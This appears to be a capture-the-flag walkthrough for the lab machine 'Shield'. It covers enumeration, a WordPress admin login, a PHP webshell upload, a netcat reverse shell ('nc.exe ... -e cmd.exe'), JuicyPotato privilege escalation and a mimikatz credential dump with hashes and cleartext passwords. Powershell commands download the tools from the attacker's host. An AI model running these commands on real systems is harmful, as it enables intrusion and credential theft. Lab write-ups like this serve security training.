# Shield
 ``` bash
 export IP=10.10.10.29
 ```
 ^ this is the ip for the box

 ## Enumeration
 ```bash
 nmap -sC -sV -oA shield_nmap $IP
```

```bash
gobuster dir -u http://$IP/ -w  /usr/share/dirb/wordlists/common.txt > gobuster.txt
```

```bash
gobuster dir -u http://$IP/ -w  /usr/share/dirb/wordlists/common.txt -x "php, html, txt, pdf, xml, json, js" > gobuster2.txt
```

### interesting finds

* 80/tcp   open  http    Microsoft IIS httpd 10.0
* 3306/tcp open  mysql   MySQL (unauthorized)
* /wordpress            (Status: 301) [Size: 152] [--> http://10.10.10.29/wordpress/]

find a http://10.10.10.29/wordpress/wp-login.php to try and log in


## Trying to log in to the wordpress page

try password combo's with admin, you log in using admin and the password from vaccine: P@s5w0rd!


## Shell

see you can upload to plugins

make a php webshell and upload

google file structure of wordpress so you know where it goes, you find out that it is possibly stored in wp-content

It is in uploads because it didn't install from plugins

http://10.10.10.29/wordpress/wp-content/uploads/webshell.php -> for shell

Upload nc.exe as well

start a nc server `nc -lvnp 1234`

using your uploaded webshell execute nc.exe `nc.exe -nv <ip> 1234 -e cmd.exe`

get shell on your machine

## inside machine
```
systeminfo

Host Name:                 SHIELD
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00376-30000-00299-AA303
Original Install Date:     2/4/2020, 12:58:01 PM
System Boot Time:          9/16/2021, 6:26:02 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,043 MB
Virtual Memory: Max Size:  2,431 MB
Virtual Memory: Available: 1,389 MB
Virtual Memory: In Use:    1,042 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    MEGACORP.LOCAL
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.29
                                 [02]: fe80::21fe:39ee:669d:99c1
                                 [03]: dead:beef::21fe:39ee:669d:99c1
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

This version of windows is vulnerable to rotten potato (juice potato). This is done by using the NTLM service exploit, which kind of works like a MITM attack to elevate your privleges.

## Juicy potato

get juicy potato off github

`python3 -m http.server`

`powershell -c "wget http://10.10.14.3:8000/jp.exe -OutFile jp.exe"`

* %comspec% -> path to cmd.exe

`.\jp.exe -l 1337 -p %comspec% -a "/c C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -nv 10.10.14.3 9999 -e cmd.exe" -t * -c "{8BC3F05E-D86B-11D0-A075-00C04FB68820}"`

You get a root shell

`c:\users\administrator\desktop`

`type root.txt` -> 6e9a9fdc6f64e410a68b847bb4b404fa

## After flag

use mimikatz to find more -> get off github

`powershell -c "wget http://10.10.14.3:8000/mimikatz.exe -OutFile mimi.exe"`

`mmi.exe`

`lsadump::sam` -> sam = system account manager

```
Authentication Id : 0 ; 296444 (00000000:000485fc)                                                                                                                                                                                          
Session           : Interactive from 1                                                                                                                                                                                                      
User Name         : sandra                                                                                                                                                                                                                  
Domain            : MEGACORP                                                                                                                                                                                                                
Logon Server      : PATHFINDER                                                                                                                                                                                                              
Logon Time        : 9/16/2021 6:27:28 PM                                                                                                                                                                                                    
SID               : S-1-5-21-1035856440-4137329016-3276773158-1105                                                                                                                                                                          
        msv :                                                                                                                                                                                                                               
         [00000003] Primary                                                                                                                                                                                                                 
         * Username : sandra                                                                                                                                                                                                                
         * Domain   : MEGACORP                                                                                                                                                                                                              
         * NTLM     : 29ab86c5c4d2aab957763e5c1720486d                                                                                                                                                                                      
         * SHA1     : 8bd0ccc2a23892a74dfbbbb57f0faa9721562a38                                                                                                                                                                              
         * DPAPI    : f4c73b3f07c4f309ebf086644254bcbc                                                                                                                                                                                      
        tspkg :                                                                                                                                                                                                                             
        wdigest :                                                                                                                                                                                                                           
         * Username : sandra                                                                                                                                                                                                                
         * Domain   : MEGACORP                                                                                                                                                                                                              
         * Password : (null)                                                                                                                                                                                                                
        kerberos :                                                                                                                                                                                                                          
         * Username : sandra                                                                                                                                                                                                                
         * Domain   : MEGACORP.LOCAL                                                                                                                                                                                                        
         * Password : Password1234!                                                                                                                                                                                                         
        ssp :                                                                                                                                                                                                                               
        credman :                                                                                                                                                                                                                           
                                                                                                                                                                                                                                            
Authentication Id : 0 ; 66096 (00000000:00010230)                                                                                                                                                                                           
Session           : Interactive from 1                                                                                                                                                                                                      
User Name         : DWM-1                                                                                                                                                                                                                   
Domain            : Window Manager                                                                                                                                                                                                          
Logon Server      : (null)                                                                                                                                                                                                                  
Logon Time        : 9/16/2021 6:26:11 PM                                                                                                                                                                                                    
SID               : S-1-5-90-0-1                                                                                                                                                                                                            
        msv :                                                                                                                                                                                                                               
         [00000003] Primary                                                                                                                                                                                                                 
         * Username : SHIELD$                                                                                                                                                                                                               
         * Domain   : MEGACORP                                                                                                                                                                                                              
         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
        tspkg :                                            
        wdigest :                                          
         * Username : SHIELD$
         * Domain   : MEGACORP
         * Password : (null)                               
        kerberos :                                         
         * Username : SHIELD$
         * Domain   : MEGACORP.LOCAL
         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
        ssp :                                              
        credman :                                  
        Authentication Id : 0 ; 66096 (00000000:00010230)                                                                                                                                                                                  [150/463]
Session           : Interactive from 1                                                                                                                                                                                                      
User Name         : DWM-1                                                                                                                                                                                                                   
Domain            : Window Manager                                                                                                                                                                                                          
Logon Server      : (null)                                                                                                                                                                                                                  
Logon Time        : 9/16/2021 6:26:11 PM                                                                                                                                                                                                    
SID               : S-1-5-90-0-1                                                                                                                                                                                                            
        msv :                                                                                                                                                                                                                               
         [00000003] Primary                                                                                                                                                                                                                 
         * Username : SHIELD$                                                                                                                                                                                                               
         * Domain   : MEGACORP                                                                                                                                                                                                              
         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
        tspkg :                                            
        wdigest :                                          
         * Username : SHIELD$
         * Domain   : MEGACORP
         * Password : (null)                               
        kerberos :                                         
         * Username : SHIELD$
         * Domain   : MEGACORP.LOCAL
         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
        ssp :                                              
        credman :                                          

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SHIELD$                                
Domain            : MEGACORP                               
Logon Server      : (null)                                 
Logon Time        : 9/16/2021 6:26:11 PM
SID               : S-1-5-20                               
        msv :                                              
         [00000003] Primary                                
         * Username : SHIELD$
         * Domain   : MEGACORP
         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
        tspkg :                                            
        wdigest :                                          
         * Username : SHIELD$
         * Domain   : MEGACORP
         * Password : (null)                               
        kerberos :                                         
         * Username : shield$
         * Domain   : MEGACORP.LOCAL
         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
        ssp :                                              
        credman :                                          

Authentication Id : 0 ; 36399 (00000000:00008e2f)
Session           : UndefinedLogonType from 0
User Name         : (null)                                 
Domain            : (null)                                 
Logon Server      : (null)      
Logon Time        : 9/16/2021 6:26:10 PM                                                                                                                                                                                                    
SID               :                                                                                                                                                                                                                         
        msv :                                              
         [00000003] Primary                                
         * Username : SHIELD$
         * Domain   : MEGACORP
         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
        tspkg :                                            
        wdigest :                                          
        kerberos :                                         
        ssp :                                              
        credman :                                          

Authentication Id : 0 ; 3699147 (00000000:003871cb)
Session           : Service from 0
User Name         : DefaultAppPool
Domain            : IIS APPPOOL
Logon Server      : (null)                                 
Logon Time        : 9/16/2021 9:00:48 PM
SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
        msv :                                              
         [00000003] Primary                                
         * Username : SHIELD$
         * Domain   : MEGACORP
         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
        tspkg :                                            
        wdigest :                                          
         * Username : SHIELD$
         * Domain   : MEGACORP
         * Password : (null)                               
        kerberos :                                         
         * Username : SHIELD$
         * Domain   : MEGACORP.LOCAL
         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
        ssp :                                              
        credman :                                          

Authentication Id : 0 ; 167608 (00000000:00028eb8)
Session           : Service from 0
User Name         : wordpress
Domain            : IIS APPPOOL
Logon Server      : (null)                                 
Logon Time        : 9/16/2021 6:26:31 PM
SID               : S-1-5-82-698136220-2753279940-1413493927-70316276-1736946139
        msv :                                              
         [00000003] Primary                                
         * Username : SHIELD$
         * Domain   : MEGACORP
         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
        tspkg :                                            
        wdigest :      
                 * Username : SHIELD$
         * Domain   : MEGACORP
         * Password : (null)                               
        kerberos :                                         
         * Username : SHIELD$
         * Domain   : MEGACORP.LOCAL
         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
        ssp :                                              
        credman :                                          

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR                                   
Domain            : NT AUTHORITY
Logon Server      : (null)                                 
Logon Time        : 9/16/2021 6:26:14 PM
SID               : S-1-5-17                               
        msv :                                              
        tspkg :                                            
        wdigest :                                          
         * Username : (null)                               
         * Domain   : (null)                               
         * Password : (null)                               
        kerberos :                                         
         * Username : IUSR                                 
         * Domain   : NT AUTHORITY
         * Password : (null)                               
        ssp :                                              
        credman :                                          

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)                                 
Logon Time        : 9/16/2021 6:26:11 PM
SID               : S-1-5-19                               
        msv :                                              
        tspkg :                                            
        wdigest :                                          
         * Username : (null)                               
         * Domain   : (null)                               
         * Password : (null)                               
        kerberos :                                         
         * Username : (null)                               
         * Domain   : (null)                               
         * Password : (null)                               
        ssp :                                              
        credman :                                          

Authentication Id : 0 ; 66077 (00000000:0001021d)
Session           : Interactive from 1
User Name         : DWM-1                                  
Domain            : Window Manager
Logon Server      : (null)                                 
Logon Time        : 9/16/2021 6:26:11 PM
SID               : S-1-5-90-0-1
        msv :                                              
         [00000003] Primary                                
         * Username : SHIELD$
         * Domain   : MEGACORP
         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
        tspkg :                                            
        wdigest :                                          
         * Username : SHIELD$
         * Domain   : MEGACORP
         * Password : (null)                               
        kerberos :                                         
         * Username : SHIELD$
         * Domain   : MEGACORP.LOCAL
         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
        ssp :                                              
        credman :                                          

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SHIELD$                                
Domain            : MEGACORP                               
Logon Server      : (null)                                 
Logon Time        : 9/16/2021 6:26:10 PM
SID               : S-1-5-18                               
        msv :                                              
        tspkg :                                            
        wdigest :                                          
         * Username : SHIELD$
         * Domain   : MEGACORP
         * Password : (null)                               
        kerberos :                                         
         * Username : shield$
         * Domain   : MEGACORP.LOCAL
         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
        ssp :                                              
        credman :                                                
```
